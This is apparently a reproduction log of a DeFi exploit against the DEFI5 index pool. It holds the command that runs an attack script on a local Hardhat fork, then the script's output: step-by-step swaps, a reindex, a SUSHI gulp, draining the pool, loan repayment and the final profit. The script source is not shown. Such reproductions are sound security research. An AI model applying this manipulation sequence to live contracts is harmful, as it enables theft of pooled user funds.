
```shell
# 安装依赖
npm i 

# 执行攻击代码
npx hardhat run scripts/exp.js
Attack deployed to: 0x04C89607413713Ec9775E14b954286519d836FEf
Step 1 start
Step 2 start
Step 3 start
Step 4 start
Step 5 start
Step 6 start
Step 7 start
Step 8 start
Assets to pay back:
UNI:   1893268653704813119979700
AAVE:  228075105151744240691866
COMP:  42653654878881489975732
MKR:   5954878688205541156656
SNX:   467708296526547391775481
CRV:   3310445005642820074514093
SUSHI: 226820000000000000000000
My assets:
UNI:   18363
AAVE:  2212
COMP:  413
MKR:   57
SNX:   4536
CRV:   32109
SUSHI: 2200
DEFI5's assets:
Uniswap: balance: 2033  denorm:9
Aave Token: balance: 75  denorm:4
Compound: balance: 57  denorm:3
Synthetix Network Token: balance: 193  denorm:0
Curve DAO Token: balance: 7417  denorm:4
MKR: balance: 6  denorm:3
Block:13417950 Time:1634236646
DEFI5 lastReweigh=1633607810, reweighIndex=23
After Reindex
DEFI5's assets:
Uniswap: balance: 2033  denorm:9
Aave Token: balance: 75  denorm:4
Compound: balance: 57  denorm:3
Synthetix Network Token: balance: 193  denorm:0
Curve DAO Token: balance: 7417  denorm:4
MKR: balance: 6  denorm:3
SushiToken: balance: 0  denorm:0
DEFI5.extrapolatePoolValueFromToken()=0x1f9840a85d5af5bf1d1762f925bdaddc4201f984, 5206
Swap AAVE start
DEFI5's AAVE=7503272940322868468600
My AAVE=221217366781517207266602, UNI=1836342050150158215305238
DEFI5's AAVE=11254909410484302702900
My AAVE=217465730311355773032302, UNI=1869038680081869931046493
DEFI5's AAVE=16882364115726454054350
My AAVE=211838275606113621680852, UNI=1896609951330376262250200
DEFI5's AAVE=25323546173589681081525
My AAVE=203397093548250394653677, UNI=1919725912302141428802753
DEFI5's AAVE=37985319260384521622287
My AAVE=190735320461455554112915, UNI=1939106507662869257909136
DEFI5's AAVE=56977978890576782433430
My AAVE=171742660831263293301772, UNI=1955355344429597158697164
DEFI5's AAVE=85466968335865173650145
My AAVE=143253671385974902085057, UNI=1968978491260616548916010
DEFI5's AAVE=128200452503797760475217
My AAVE=100520187218042315259985, UNI=1980400239921390790231139
DEFI5's AAVE=192300678755696640712825
My AAVE=36419960966143435022377, UNI=1989976319816004714232157
DEFI5's AAVE=228720639721840075735202
My AAVE=0, UNI=1993577771291939392798701
Swap AAVE end
Swap COMP start
DEFI5's COMP=5709373302659784538790
My COMP=41371149252067400558421, UNI=1993577771291939392798701
DEFI5's COMP=8564059953989676808185
My COMP=38516462600737508289026, UNI=1999588490641636940161817
DEFI5's COMP=12846089930984515212277
My COMP=34234432623742669884934, UNI=2004863885406997920236250
DEFI5's COMP=19269134896476772818415
My COMP=27811387658250412278796, UNI=2009444792875207262205850
DEFI5's COMP=28903702344715159227622
My COMP=18176820210012025869589, UNI=2013422639873518145941643
DEFI5's COMP=43355553517072738841433
My COMP=3724969037654446255778, UNI=2016876817206673525797949
DEFI5's COMP=47080522554727185097211
My COMP=0, UNI=2017519557688203373492612
Swap COMP end
Swap SNX start
DEFI5's SNX=19308368073168197328834
My SNX=453645292460278750509681, UNI=2017519557688203373492612
DEFI5's SNX=28962552109752295993251
My SNX=443991108423694651845264, UNI=2017842006211273259956757
DEFI5's SNX=43443828164628443989876
My SNX=429509832368818503848639, UNI=2018159758859248740131939
DEFI5's SNX=65165742246942665984814
My SNX=407787918286504281853701, UNI=2018472884018992598581004
DEFI5's SNX=97748613370413998977221
My SNX=375205047163032948861294, UNI=2018781449081437594580230
DEFI5's SNX=146622920055620998465831
My SNX=326330740477825949372684, UNI=2019085520456090367911757
DEFI5's SNX=219934380083431497698746
My SNX=253019280450015450139769, UNI=2019385163585324121700700
DEFI5's SNX=329901570125147246548119
My SNX=143052090408299701290396, UNI=2019680442958463158374333
DEFI5's SNX=472953660533446947838515
My SNX=0, UNI=2019939060441713398883196
Swap SNX end
Swap CRV start
DEFI5's CRV=741773281460556601215969
My CRV=3210906891991096095551982, UNI=2019939060441713398883196
DEFI5's CRV=1112659922190834901823953
My CRV=2840020251260817794943998, UNI=2023006769200908230164407
DEFI5's CRV=1668989883286252352735929
My CRV=2283690290165400344032022, UNI=2025615215678797117763332
DEFI5's CRV=2503484824929378529103893
My CRV=1449195348522274167664058, UNI=2027815115662345997578965
DEFI5's CRV=3755227237394067793655839
My CRV=197452936057584903112112, UNI=2029670457521434169052745
DEFI5's CRV=3952680173451652696767951
My CRV=0, UNI=2029882598778599655482127
Swap CRV end
Swap MKR start
DEFI5's MKR=638743506158176865112
My MKR=5775828019598003061742, UNI=2029882598778599655482127
DEFI5's MKR=958115259237265297668
My MKR=5456456266518914629186, UNI=2031039001013358652674724
DEFI5's MKR=1437172888855897946502
My MKR=4977398636900281980352, UNI=2032058644930064680714561
DEFI5's MKR=2155759333283846919753
My MKR=4258812192472333007101, UNI=2032957703826377074269577
DEFI5's MKR=3233638999925770379629
My MKR=3180932525830409547225, UNI=2033750438315148119364755
DEFI5's MKR=4850458499888655569443
My MKR=1564113025867524357411, UNI=2034449422522150206645999
DEFI5's MKR=6414571525756179926854
My MKR=0, UNI=2034882089424005751671280
Swap MKR end
After swap UNI
DEFI5.extrapolatePoolValueFromToken()=0x1f9840a85d5af5bf1d1762f925bdaddc4201f984, 123
DEFI5's assets:
Uniswap: balance: 47  denorm:9
Aave Token: balance: 2287  denorm:4
Compound: balance: 470  denorm:3
Synthetix Network Token: balance: 4729  denorm:0
Curve DAO Token: balance: 39526  denorm:4
MKR: balance: 64  denorm:3
SushiToken: balance: 0  denorm:0
DEFI5's Uniswap=4778825932293065848429
My Uniswap=2034882089424005751671280
DEFI5's Uniswap=7168238898439598772643
My Uniswap=2032492676457859218747066
DEFI5's Uniswap=10752358347659398158964
My Uniswap=2028908557008639419360745
DEFI5's Uniswap=16128537521489097238446
My Uniswap=2023532377834809720281263
DEFI5's Uniswap=24192806282233645857669
My Uniswap=2015468109074065171662040
DEFI5's Uniswap=36289209423350468786503
My Uniswap=2003371705932948348733206
DEFI5's Uniswap=54433814135025703179754
My Uniswap=1985227101221273114339955
DEFI5's Uniswap=81650721202538554769631
My Uniswap=1958010194153760262750078
DEFI5's Uniswap=122476081803807832154446
My Uniswap=1917184833552490985365263
DEFI5's Uniswap=183714122705711748231669
My Uniswap=1855946792650587069288040
DEFI5's Uniswap=275571184058567622347503
My Uniswap=1764089731297731195172206
DEFI5's Uniswap=413356776087851433521254
My Uniswap=1626304139268447383998455
DEFI5's Uniswap=620035164131777150281881
My Uniswap=1419625751224521667237828
DEFI5's Uniswap=930052746197665725422821
My Uniswap=1109608169158633092096888
DEFI5's Uniswap=1395079119296498588134231
My Uniswap=644581796059800229385478
DEFI5's Uniswap=2039660915356298817519709
My Uniswap=0
After join UNI
DEFI5's assets:
Uniswap: balance: 20396  denorm:9
Aave Token: balance: 2287  denorm:4
Compound: balance: 470  denorm:3
Synthetix Network Token: balance: 4729  denorm:0
Curve DAO Token: balance: 39526  denorm:4
MKR: balance: 64  denorm:3
SushiToken: balance: 0  denorm:0
After gulp SUSHI
DEFI5's assets:
Uniswap: balance: 20396  denorm:9
Aave Token: balance: 2287  denorm:4
Compound: balance: 470  denorm:3
Synthetix Network Token: balance: 4729  denorm:0
Curve DAO Token: balance: 39526  denorm:4
MKR: balance: 64  denorm:3
SushiToken: balance: 2200  denorm:184
DEFI5's SushiToken=22445302163012671360000
My SushiToken=197554697836987328640000
DEFI5's SushiToken=33667953244519007040000
My SushiToken=186332046755480992960000
DEFI5's SushiToken=50501929866778510560000
My SushiToken=169498070133221489440000
DEFI5's SushiToken=75752894800167765840000
My SushiToken=144247105199832234160000
DEFI5's SushiToken=113629342200251648760000
My SushiToken=106370657799748351240000
DEFI5's SushiToken=170444013300377473140000
My SushiToken=49555986699622526860000
DEFI5's SushiToken=220000000000000000000000
My SushiToken=0
DEFI5's SushiToken=30659718603394341780000
My SushiToken=189340281396605658220000
DEFI5's SushiToken=45989577905091512670000
My SushiToken=174010422094908487330000
DEFI5's SushiToken=68984366857637269005000
My SushiToken=151015633142362730995000
DEFI5's SushiToken=103476550286455903507500
My SushiToken=116523449713544096492500
DEFI5's SushiToken=155214825429683855261250
My SushiToken=64785174570316144738750
DEFI5's SushiToken=220000000000000000000000
My SushiToken=0
After pouring all out
DEFI5's assets:
Uniswap: balance: 52  denorm:9
Aave Token: balance: 5  denorm:4
Compound: balance: 1  denorm:3
Synthetix Network Token: balance: 12  denorm:0
Curve DAO Token: balance: 102  denorm:4
MKR: balance: 0  denorm:3
SushiToken: balance: 399  denorm:184
My assets:
UNI:   20343
AAVE:  2281
COMP:  469
MKR:   63
SNX:   4717
CRV:   39424
SUSHI: 1800
Finally
My assets:
UNI:   1411
AAVE:  0
COMP:  43
MKR:   0
SNX:   40
CRV:   6320
SUSHI: 0
Step 8 end.
Step 7 end.
Step 6 end.
Step 5 end.
Step 4 end.
Step 3 end.
Step 2 end.
Step 1 end.
{
  to: '0x04C89607413713Ec9775E14b954286519d836FEf',
  from: '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266',
  contractAddress: null,
  transactionIndex: 0,
  gasUsed: BigNumber { value: "7173671" },
  blockHash: '0x54a5a45f80681eefc32307f3ba3807d67b34648b5ab2c7e3a08f125bf0502051',
  transactionHash: '0xb48385549ba4d2d9f40576d10926b01292c1597d01eef40ed8db7e6dca05a275',
  blockNumber: 13417950,
  confirmations: 1,
  cumulativeGasUsed: BigNumber { value: "7173671" },
  effectiveGasPrice: BigNumber { value: "114733310867" },
  status: 1,
  type: 2,
  byzantium: true
}
```
